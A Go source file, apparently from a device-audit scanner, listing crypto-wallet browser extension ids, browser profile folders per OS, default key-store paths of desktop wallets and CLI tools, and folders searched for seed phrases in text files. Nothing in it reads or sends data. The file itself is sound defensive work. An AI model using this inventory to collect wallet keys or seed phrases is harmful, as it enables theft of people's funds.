package device

import "path/filepath"

// Everything in this file is an outside fact: where browsers and wallets keep
// their files, and the ids of wallet extensions. The list was written on
// 2026-11-10 and compared with the stores and the projects' sources that
// day; entries marked 확인 필요 could not be confirmed. A wrong entry means a
// wallet that is not seen. The list goes stale: wallets are renamed, moved
// and shut down.

// walletExtensions are wallet extensions of Chrome-family browsers by their
// extension id (Chrome Web Store unless said otherwise), under the name they
// are reported with. An extension that is no longer offered keeps its id:
// its store can still be on a disk.
var walletExtensions = map[string]string{
	"nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
	"ejbalbakoplchlghecdalmeeeajnimhm": "MetaMask", // Edge Add-ons id
	"bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
	"hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase Wallet",
	"egjidjbpglichdcondbcbdnbeeppgdph": "Trust Wallet",
	"acmacodkjbdgmoleebolmdjonilkdbch": "Rabby",
	"fhbohimaelbohpjbbldcngcnapndodjp": "BNB Chain Wallet(단종)",
	"ibnejdfjmmkpcnlpebklmnkoeoihofec": "TronLink",
	"dmkamcknogkgcdfhhbddcghachkejeap": "Keplr",
	"fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin Wallet",
	"mcohilncbfahbmgdjkbpemcciiolgcge": "OKX Wallet",
	"jblndlipeogpafnldhgmapagcccfchpi": "Kaia Wallet(옛 Kaikas)",
	"aholpfdialjgjfhomihkjbmgjidlcdno": "Exodus Web3",
	"bhhhlbepdkbapadjdnnojkbgioiodbic": "Solflare",
	"aflkmfhebedbjioipglgcbcmnbpgliof": "Backpack",
	"opcgpfmipidbgpenhmajoajpbobppdil": "Slush(옛 Sui Wallet)",
	"ejjladinnckdgjemekebdpeokbikhfci": "Petra",
	"ldinpeekobnhjjdofggfgjlcehhmanlj": "Leather",
	"ppbibelpcjmhbdihakflkdcoccbgbkpo": "UniSat",
	"klghhnkeealcohjjanjjdaeeggmfmlpl": "Zerion",
	"opfgelmcmbiajamepnmloijbpoleiama": "Rainbow",
	"jiidiaalihmmhddjgbnbgdfflelocpak": "Bitget Wallet",
	"aeachknmefphepccionboohckonoeemg": "Coin98",
	"idnnbdplmphpflfnlkomgpfbpcgelopg": "Xverse",
	"ffnbelfdoeiohenkjibnmadjiehjhajb": "SecondFi(옛 Yoroi)",
	"lpfcbjknijpeeillifnkikgncikgfhdo": "Nami(단종 예정)",
	"afbcbjpbpfadlkmhmclhkeeodmamcflc": "MathWallet",
	"aiifbnbfobpmeekipheeijimdpnlpgpp": "Station Wallet",
	"hpglfhgfnhbgpjdenjgmdgoeiappafln": "Guarda",
	"kkpllkodjeloidieedojogacfhpaihoh": "Enkrypt",
	"jnmbobjmhlngoefaiojfljckilhhlhcj": "OneKey",
	"hmeobnfnfcmdkdcmlblgagmfpfboieaf": "Ctrl(옛 XDEFI, 단종)",
	"ookjlbkiijinhpmnjffcofjonbfbgaoc": "Temple",
}

// firefoxWallets are wallet add-ons of Firefox by their add-on id.
var firefoxWallets = map[string]string{
	"webextension@metamask.io": "MetaMask",
}

// browserRoot is the folder a browser keeps its profiles in.
type browserRoot struct {
	name string
	path string
}

// appDirs are the per-user folders programs keep their data in.
type appDirs struct {
	home string
	// local, roaming: %LOCALAPPDATA%, %APPDATA% (Windows).
	local, roaming string
	// support: ~/Library/Application Support (macOS).
	support string
	// config: ~/.config (Linux; XDG_CONFIG_HOME is not consulted, the
	// browsers and wallets below do not all follow it).
	config string
}

func newAppDirs(home string, env func(string) string) appDirs {
	d := appDirs{
		home:    home,
		local:   env("LOCALAPPDATA"),
		roaming: env("APPDATA"),
		support: filepath.Join(home, "Library", "Application Support"),
		config:  filepath.Join(home, ".config"),
	}
	if d.local == "" {
		d.local = filepath.Join(home, "AppData", "Local")
	}
	if d.roaming == "" {
		d.roaming = filepath.Join(home, "AppData", "Roaming")
	}
	return d
}

// chromiumRoots are the profile folders of Chrome-family browsers. A profile
// is the folder itself (Opera) or a folder in it ("Default", "Profile 1").
func chromiumRoots(d appDirs) []browserRoot {
	j := filepath.Join
	switch goos {
	case "windows":
		return []browserRoot{
			{"Chrome", j(d.local, "Google", "Chrome", "User Data")},
			{"Edge", j(d.local, "Microsoft", "Edge", "User Data")},
			{"Brave", j(d.local, "BraveSoftware", "Brave-Browser", "User Data")},
			{"Chromium", j(d.local, "Chromium", "User Data")},
			{"Whale", j(d.local, "Naver", "Naver Whale", "User Data")}, // 확인 필요
			{"Opera", j(d.roaming, "Opera Software", "Opera Stable")},
			{"Opera GX", j(d.roaming, "Opera Software", "Opera GX Stable")},
			{"Vivaldi", j(d.local, "Vivaldi", "User Data")},
		}
	case "darwin":
		return []browserRoot{
			{"Chrome", j(d.support, "Google", "Chrome")},
			{"Edge", j(d.support, "Microsoft Edge")},
			{"Brave", j(d.support, "BraveSoftware", "Brave-Browser")},
			{"Chromium", j(d.support, "Chromium")},
			{"Whale", j(d.support, "Naver", "Whale")}, // 확인 필요
			{"Opera", j(d.support, "com.operasoftware.Opera")},
			{"Opera GX", j(d.support, "com.operasoftware.OperaGX")},
			{"Vivaldi", j(d.support, "Vivaldi")},
			{"Arc", j(d.support, "Arc", "User Data")},
		}
	}
	return []browserRoot{
		{"Chrome", j(d.config, "google-chrome")},
		{"Edge", j(d.config, "microsoft-edge")},
		{"Brave", j(d.config, "BraveSoftware", "Brave-Browser")},
		{"Chromium", j(d.config, "chromium")},
		{"Chromium", j(d.home, "snap", "chromium", "common", "chromium")}, // snap. 확인 필요
		{"Whale", j(d.config, "naver-whale")},                             // 확인 필요
		{"Opera", j(d.config, "opera")},
		{"Vivaldi", j(d.config, "vivaldi")},
	}
}

// firefoxRoots are the folders Firefox keeps its profile folders in.
func firefoxRoots(d appDirs) []browserRoot {
	j := filepath.Join
	switch goos {
	case "windows":
		return []browserRoot{{"Firefox", j(d.roaming, "Mozilla", "Firefox", "Profiles")}}
	case "darwin":
		return []browserRoot{{"Firefox", j(d.support, "Firefox", "Profiles")}}
	}
	return []browserRoot{
		{"Firefox", j(d.home, ".mozilla", "firefox")},
		{"Firefox", j(d.home, "snap", "firefox", "common", ".mozilla", "firefox")}, // snap. 확인 필요
	}
}

// walletPlace is where a desktop wallet or a command-line tool keeps keys: a
// file, or a folder that counts when it holds anything.
type walletPlace struct {
	id   string // DV-203: usually locked with a password. DV-204: stored unlocked by default.
	name string
	path string
}

// walletPlaces are the default key stores of desktop wallets and tools.
func walletPlaces(d appDirs) []walletPlace {
	j := filepath.Join
	// The same on every system.
	out := []walletPlace{
		{"DV-204", "Solana CLI", j(d.home, ".config", "solana", "id.json")},
		{"DV-204", "Sui CLI", j(d.home, ".sui", "sui_config", "sui.keystore")},
	}
	switch goos {
	case "windows":
		return append(out,
			walletPlace{"DV-203", "Bitcoin Core", j(d.roaming, "Bitcoin", "wallet.dat")},
			walletPlace{"DV-203", "Bitcoin Core", j(d.roaming, "Bitcoin", "wallets")},
			walletPlace{"DV-203", "Electrum", j(d.roaming, "Electrum", "wallets")},
			walletPlace{"DV-203", "Exodus", j(d.roaming, "Exodus", "exodus.wallet")},
			walletPlace{"DV-203", "Atomic Wallet", j(d.roaming, "atomic", "Local Storage", "leveldb")}, // 확인 필요
			walletPlace{"DV-203", "geth", j(d.local, "Ethereum", "keystore")},
			walletPlace{"DV-203", "geth", j(d.roaming, "Ethereum", "keystore")},
			walletPlace{"DV-203", "Wasabi Wallet", j(d.roaming, "WalletWasabi", "Client", "Wallets")},
			walletPlace{"DV-203", "Sparrow", j(d.roaming, "Sparrow", "wallets")},
			walletPlace{"DV-203", "Monero GUI", j(d.home, "Documents", "Monero", "wallets")},
		)
	case "darwin":
		return append(out,
			walletPlace{"DV-203", "Bitcoin Core", j(d.support, "Bitcoin", "wallet.dat")},
			walletPlace{"DV-203", "Bitcoin Core", j(d.support, "Bitcoin", "wallets")},
			walletPlace{"DV-203", "Electrum", j(d.home, ".electrum", "wallets")},
			walletPlace{"DV-203", "Exodus", j(d.support, "Exodus", "exodus.wallet")},
			walletPlace{"DV-203", "Atomic Wallet", j(d.support, "atomic", "Local Storage", "leveldb")}, // 확인 필요
			walletPlace{"DV-203", "geth", j(d.home, "Library", "Ethereum", "keystore")},
			walletPlace{"DV-203", "Wasabi Wallet", j(d.home, ".walletwasabi", "client", "Wallets")},
			walletPlace{"DV-203", "Sparrow", j(d.home, ".sparrow", "wallets")},
			walletPlace{"DV-203", "Monero GUI", j(d.home, "Monero", "wallets")},
		)
	}
	return append(out,
		walletPlace{"DV-203", "Bitcoin Core", j(d.home, ".bitcoin", "wallet.dat")},
		walletPlace{"DV-203", "Bitcoin Core", j(d.home, ".bitcoin", "wallets")},
		walletPlace{"DV-203", "Electrum", j(d.home, ".electrum", "wallets")},
		walletPlace{"DV-203", "Exodus", j(d.config, "Exodus", "exodus.wallet")},
		walletPlace{"DV-203", "Atomic Wallet", j(d.config, "atomic", "Local Storage", "leveldb")}, // 확인 필요
		walletPlace{"DV-203", "geth", j(d.home, ".ethereum", "keystore")},
		walletPlace{"DV-203", "Wasabi Wallet", j(d.home, ".walletwasabi", "client", "Wallets")},
		walletPlace{"DV-203", "Sparrow", j(d.home, ".sparrow", "wallets")},
		walletPlace{"DV-203", "Monero GUI", j(d.home, "Monero", "wallets")},
	)
}

// textDirs are the folders searched for seed phrases written in text files,
// below the home folder itself: the folders people keep notes in and the
// folders that are copied to a cloud service.
func textDirs(d appDirs, env func(string) string) []string {
	j := filepath.Join
	out := []string{
		j(d.home, "Desktop"), j(d.home, "Documents"), j(d.home, "Downloads"),
		j(d.home, "OneDrive"), j(d.home, "Dropbox"),
	}
	switch goos {
	case "windows":
		out = append(out,
			j(d.home, "Google Drive"),
			j(d.home, "iCloudDrive"), // iCloud for Windows. 확인 필요
		)
		for _, k := range []string{"OneDrive", "OneDriveConsumer", "OneDriveCommercial"} {
			if p := env(k); p != "" {
				out = append(out, p)
			}
		}
	case "darwin":
		// On Linux "Google Drive" is left out: there it is usually a
		// network mount, and reading from it downloads.
		out = append(out,
			j(d.home, "Google Drive"),
			j(d.home, "Library", "Mobile Documents", "com~apple~CloudDocs"),
			j(d.home, "Library", "CloudStorage"),
		)
	default:
		// A Korean desktop names the folders in Korean.
		out = append(out, j(d.home, "바탕화면"), j(d.home, "문서"), j(d.home, "다운로드"))
	}
	return out
}
